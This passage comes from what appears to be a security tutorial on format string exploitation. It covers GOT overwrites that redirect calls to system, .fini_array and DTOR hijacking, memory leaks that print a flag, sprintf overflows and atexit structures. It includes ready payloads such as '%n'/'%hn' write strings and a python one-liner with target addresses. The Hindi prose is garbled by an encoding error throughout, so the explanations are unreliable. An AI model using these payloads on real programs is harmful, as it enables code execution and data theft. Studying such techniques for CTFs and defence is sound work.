рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ред

рдлреЙрд░реНрдореЗрдЯрд░реНрд╕:
```bash
%08x тАФ> 8 hex bytes
%d тАФ> Entire
%u тАФ> Unsigned
%s тАФ> String
%n тАФ> Number of written bytes
%hn тАФ> Occupies 2 bytes instead of 4
<n>$X тАФ> Direct access, Example: ("%3$d", var1, var2, var3) тАФ> Access to var3
```
**`%n`** **рд▓рд┐рдЦрддрд╛ рд╣реИ** **рд▓рд┐рдЦреЗ рдЧрдП рдмрд╛рдЗрдЯреНрд╕ рдХреА рд╕рдВрдЦреНрдпрд╛** **рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрддреЗ рдкрд░ред рд▓рд┐рдЦрдирд╛** рдЙрддрдиреЗ рд╣реА **рдмрд╛рдЗрдЯреНрд╕** рдЬрд┐рддрдиреА рд╣реЗрдХреНрд╕ рд╕рдВрдЦреНрдпрд╛ рд╣рдореЗрдВ **рд▓рд┐рдЦрдиреА рд╣реЛрддреА рд╣реИ** рдпрд╣реА рддрд░реАрдХрд╛ рд╣реИ **рдХреЛрдИ рднреА рдбреЗрдЯрд╛ рд▓рд┐рдЦрдиреЗ рдХрд╛**ред
```bash
AAAA%.6000d%4\$n тАФ> Write 6004 in the address indicated by the 4┬║ param
AAAA.%500\$08x тАФ> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

рдпрд╣ рд╡рд╣ рддрд╛рд▓рд┐рдХрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдпреБрдХреНрдд **рдмрд╛рд╣рд░реА рдлрдВрдХреНрд╢рдиреНрд╕** рдХреЗ **рдкрддреЗ** рд╣реЛрддреЗ рд╣реИрдВред

рдЗрд╕ рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

рджреЗрдЦреЗрдВ рдХрд┐ GEF рдореЗрдВ **рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓** **рд▓реЛрдб** рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЖрдк GOT рдореЗрдВ рдореМрдЬреВрдж **рдлрдВрдХреНрд╢рдиреНрд╕** рдХреЛ **рджреЗрдЦ** рд╕рдХрддреЗ рд╣реИрдВ: `gefтЮд x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ **рдбрд┐рдмрдЧрд┐рдВрдЧ рд╕реЗрд╢рди** рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **`got`** рдЪрд▓рд╛рдХрд░ got рддрд╛рд▓рд┐рдХрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (621).png>)

рдПрдХ рдмрд╛рдЗрдирд░реА рдореЗрдВ GOT рдореЗрдВ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ **рдкрддреЗ** рдпрд╛ PLT рд╕реЗрдХреНрд╢рди рдХреЗ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдлрдВрдХреНрд╢рди рдкрддреЗ рдХреЛ рд▓реЛрдб рдХрд░реЗрдЧрд╛ред рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдПрдХ рдлрдВрдХреНрд╢рди рдХреЗ GOT рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдмрд╛рдж рдореЗрдВ **`system`** **рдлрдВрдХреНрд╢рди** рдХреЗ PLT рдХреЗ **рдкрддреЗ** рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рдЖрдк рдПрдХ **рдлрдВрдХреНрд╢рди** рдХреЗ GOT рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдб** рдХрд░реЗрдВрдЧреЗ рдЬреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рддрд╛рдХрд┐ рдЖрдк system рдлрдВрдХреНрд╢рди рдХреЛ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХреЗрдВ)ред

рдпрджрд┐ **`system`** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ system рдлрдВрдХреНрд╢рди рдХрд╛ GOT рдореЗрдВ рдХреЛрдИ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рд╣реЛрдЧреАред рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ `system` рдлрдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдХреЛ **рд▓реАрдХ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

**Procedure Linkage Table** рдПрдХ **рд░реАрдб рдУрдирд▓реА** рддрд╛рд▓рд┐рдХрд╛ рд╣реИ ELF рдлрд╛рдЗрд▓ рдореЗрдВ рдЬреЛ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ **рд╕рд┐рдВрдмрд▓реНрд╕ рдХреЛ рд╕реНрдЯреЛрд░** рдХрд░рддреА рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЬрдм рдЗрди рдлрдВрдХреНрд╢рдиреНрд╕ рдореЗрдВ рд╕реЗ рдХреЛрдИ рдПрдХ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ GOT **рдлреНрд▓реЛ** рдХреЛ PLT рдХреА рдУрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рд╡рд╣ рдлрдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдХреЛ **рд░рд┐рдЬрд╝реЙрд▓реНрд╡** рдХрд░ рд╕рдХреЗ рдФрд░ рдЙрд╕реЗ GOT рдкрд░ рд▓рд┐рдЦ рд╕рдХреЗред\
рдлрд┐рд░, **рдЕрдЧрд▓реА рдмрд╛рд░** рдЬрдм рдЙрд╕ рдкрддреЗ рдкрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ **рдлрдВрдХреНрд╢рди** рд╕реАрдзреЗ **рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдмрд┐рдирд╛ рдЙрд╕реЗ рд░рд┐рдЬрд╝реЙрд▓реНрд╡ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗред

рдЖрдк PLT рдХреЗ рдкрддреЗ **`objdump -j .plt -d ./vuln_binary`** рдХреЗ рд╕рд╛рде рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

### **Exploit Flow**

рдкрд╣рд▓реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ рд▓рдХреНрд╖реНрдп рдмрд╛рдж рдореЗрдВ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ GOT рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ **рдлрдВрдХреНрд╢рди** рдХреЗ **рдкрддреЗ** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рд╣рдо рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рд╕реЗрдХреНрд╢рди рдореЗрдВ рд╕реНрдерд┐рдд рдПрдХ **рд╢реЗрд▓рдХреЛрдб** рдХреЗ **рдкрддреЗ** рдХреЛ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдмрд╣реБрдд рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рд╕реЗрдХреНрд╢рди рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред\
рдЗрд╕рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рд╡рд┐рдХрд▓реНрдк рд╣реИ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░рдирд╛ рдПрдХ **рдлрдВрдХреНрд╢рди** рдХреЛ рдЬреЛ рдЕрдкрдиреЗ **рдЖрд░реНрдЧреНрдпреБрдореЗрдВрдЯреНрд╕** рдХреЛ **рдпреВрдЬрд░** рд╕реЗ **рдкреНрд░рд╛рдкреНрдд** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ **`system`** **рдлрдВрдХреНрд╢рди** рдХреА рдУрд░ **рдкреЙрдЗрдВрдЯ** рдХрд░рддрд╛ рд╣реИред

рдкрддреЗ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдорддреМрд░ рдкрд░ 2 рдЪрд░рдг рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: рдЖрдк **рдкрд╣рд▓реЗ 2Bytes** рдХреЗ рдкрддреЗ рдХреЛ рд▓рд┐рдЦрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рджреВрд╕рд░реЗ 2 рдХреЛред рдЗрд╕рдХреЗ рд▓рд┐рдП **`$hn`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**HOB** рдХреЛ рдкрддреЗ рдХреЗ 2 рдЙрдЪреНрдЪрддрд░ рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ\
**LOB** рдХреЛ рдкрддреЗ рдХреЗ 2 рдирд┐рдЪрд▓реЗ рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЗрд╕рд▓рд┐рдП, рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдХреЗ рдХрд╛рд░рдг рдЖрдкрдХреЛ \[HOB, LOB] рдореЗрдВ рд╕реЗ **рд╕рдмрд╕реЗ рдЫреЛрдЯреЗ рдХреЛ рдкрд╣рд▓реЗ рд▓рд┐рдЦрдирд╛** рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ рджреВрд╕рд░реЗ рдХреЛред

рдпрджрд┐ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

рдпрджрд┐ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 N┬║Param_dir_HOB LOB_shell-HOB_shell N┬║Param_dir_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String Exploit Template**

рдЖрдк рдпрд╣рд╛рдВ format-strings рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ GOT рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini_array**

рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдПрдХ рд╕рдВрд░рдЪрдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдлрдВрдХреНрд╢рдиреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ**ред рдпрд╣ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ **рд╢реЗрд▓рдХреЛрдб рдХреЛ рдХреЗрд╡рд▓ рдПрдХ рдкрддреЗ рдкрд░ рдЬрдВрдк рдХрд░рдХреЗ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдпрд╛ рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдореЗрди рдореЗрдВ рд╡рд╛рдкрд╕ рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ **рджреВрд╕рд░реА рдмрд╛рд░ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░ рд╕рдХреЗрдВ**ред
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдПрдХ **рдЕрдирдВрдд рд▓реВрдк рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдЖрдк рдореБрдЦреНрдп рдХрд╛рд░реНрдпрдХреНрд░рдо рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрддреЗ рд╣реИрдВ рддреЛ рдХреИрдирд░реА рдиреЛрдЯрд┐рд╕ рдХрд░реЗрдЧрд╛, рд╕реНрдЯреИрдХ рдХрд╛ рдЕрдВрдд рднреНрд░рд╖реНрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрдВрдХреНрд╢рди рдлрд┐рд░ рд╕реЗ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХреЗ рд╕рд╛рде рдЖрдк рд╡рд▓реНрди рдХрд╛ **рдПрдХ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

### **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдбрдВрдк рдХрд░рдирд╛**

рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рдореЗрдореЛрд░реА рд╕реЗ **рд╕рд╛рдордЧреНрд░реА рдбрдВрдк рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рдПрдХ **рд╕реНрдерд╛рдиреАрдп рдЪрд░ рд╣реИ рдЬреЛ рдПрдХ рдлреНрд▓реИрдЧ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИред** рдпрджрд┐ рдЖрдк **рдкрддрд╛ рд▓рдЧрд╛рддреЗ рд╣реИрдВ** рдХрд┐ **рдореЗрдореЛрд░реА** рдореЗрдВ **рдлреНрд▓реИрдЧ рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯрд░** рдХрд╣рд╛рдВ рд╣реИ, рддреЛ рдЖрдк **printf рдХреЛ рдЙрд╕ рдкрддреЗ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ** рдФрд░ **рдлреНрд▓реИрдЧ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:

рддреЛ, рдлреНрд▓реИрдЧ **0xffffcf4c** рдореЗрдВ рд╣реИ

![](<../../.gitbook/assets/image (618) (2).png>)

рдФрд░ рд▓реАрдХ рд╕реЗ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдлреНрд▓реИрдЧ рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯрд░** **8рд╡реЗрдВ** рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╣реИ:

![](<../../.gitbook/assets/image (623).png>)

рддреЛ, **8рд╡реЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдХреЗ** рдЖрдк рдлреНрд▓реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (624).png>)

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдкрд┐рдЫрд▓реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП** рдФрд░ рдпрд╣ рд╕рдордЭрддреЗ рд╣реБрдП рдХрд┐ рдЖрдк **рд╕рд╛рдордЧреНрд░реА рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЖрдк **`printf` рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯрд░реНрд╕ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд╣рд╛рдВ **рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓** **рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдФрд░ рдЗрд╕реЗ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**!

### **DTOR**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдПрдХ рдмрд╛рдЗрдирд░реА рдореЗрдВ dtor рд╕реЗрдХреНрд╢рди рд╣реЛрдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм рд╣реИ**ред
{% endhint %}

рдбрд┐рд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╡реЗ рдлрдВрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред\
рдпрджрд┐ рдЖрдк **`__DTOR_END__` рдореЗрдВ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдХреЗ рдкрддреЗ рдХреЛ рд▓рд┐рдЦрдиреЗ** рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╡рд╣ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдЗрд╕ рд╕реЗрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep тАЬ__DTORтАЭ
```
рдЖрдорддреМрд░ рдкрд░ рдЖрдк **DTOR** рдЕрдиреБрднрд╛рдЧ рдХреЛ `ffffffff` рдФрд░ `00000000` рдорд╛рдиреЛрдВ **рдХреЗ рдмреАрдЪ** рдкрд╛рдПрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдпреЗ рдорд╛рди рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХреЛрдИ рднреА рдлрдВрдХреНрд╢рди рдкрдВрдЬреАрдХреГрдд рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП **`00000000`** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдВ **рд╢реЗрд▓рдХреЛрдб** рдХреЗ **рдкрддреЗ** рдХреЗ рд╕рд╛рде рддрд╛рдХрд┐ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

### **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛрдЬ рддрдХ**

**sprintf** рдПрдХ рдлреЙрд░реНрдореЗрдЯреЗрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ **рдПрдХ рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред** рдЗрд╕рд▓рд┐рдП, рдЖрдк рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА **рдлреЙрд░реНрдореЗрдЯрд┐рдВрдЧ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ **рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ** рд╣реЛ рд╕рдХреЗ рдЬрд╣рд╛рдВ рд╕рд╛рдордЧреНрд░реА рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб `%.44xAAAA` **рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ 44B+"AAAA" рд▓рд┐рдЦреЗрдЧрд╛**, рдЬрд┐рд╕рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### **\_\_atexit рд╕рдВрд░рдЪрдирд╛рдПрдВ**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм рд╣реИ**ред
{% endhint %}

**`atexit()`** рдПрдХ рдлрдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреНрдп рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред** рдпреЗ **рдлрдВрдХреНрд╢рдиреНрд╕** **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ рдЬрдм **`exit()`** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ **рдореЗрди** рдХреА **рд╡рд╛рдкрд╕реА** рд╣реЛрддреА рд╣реИред\
рдЕрдЧрд░ рдЖрдк рдЗрди **рдлрдВрдХреНрд╢рдиреНрд╕** рдХреЗ **рдкрддреЗ** рдХреЛ **рдореЙрдбрд┐рдлрд╛рдИ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рд╢реЗрд▓рдХреЛрдб рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗ, рддреЛ рдЖрдк **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХрд╛ **рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд▓реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред\
рд╡рд░реНрддрдорд╛рди рдореЗрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдкрддреЗ** рдХрдИ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рдкреАрдЫреЗ **рдЫрд┐рдкреЗ рд╣реБрдП** рд╣реИрдВ рдФрд░ рдЕрдВрдд рдореЗрдВ рдЬрд┐рд╕ рдкрддреЗ рдХреА рдУрд░ рдпрд╣ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдкрддреЗ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **XOR рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб** рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ **рд░реИрдВрдбрдо рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде рд╡рд┐рд╕реНрдерд╛рдкрди рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдпрд╣ рд╣рдорд▓реЗ рдХрд╛ рд╡реЗрдХреНрдЯрд░ **x86** рдФрд░ **x64\_86** рдкрд░ рдХрдо рд╕реЗ рдХрдо **рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ**ред\
**рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрдВрдХреНрд╢рди** **`PTR_MANGLE`** рд╣реИред **рдЕрдиреНрдп рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░реНрд╕** рдЬреИрд╕реЗ рдХрд┐ m68k, mips32, mips64, aarch64, arm, hppa... **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрдВрдХреНрд╢рди рдХреЛ рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд░рддреЗ** рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рд╡рд╣реА рд▓реМрдЯрд╛рддрд╛ рд╣реИ** рдЬреЛ рдЗрд╕реЗ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рд╣реБрдЖ рдерд╛ред рдЗрд╕рд▓рд┐рдП рдпреЗ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░реНрд╕ рдЗрд╕ рд╡реЗрдХреНрдЯрд░ рд╕реЗ 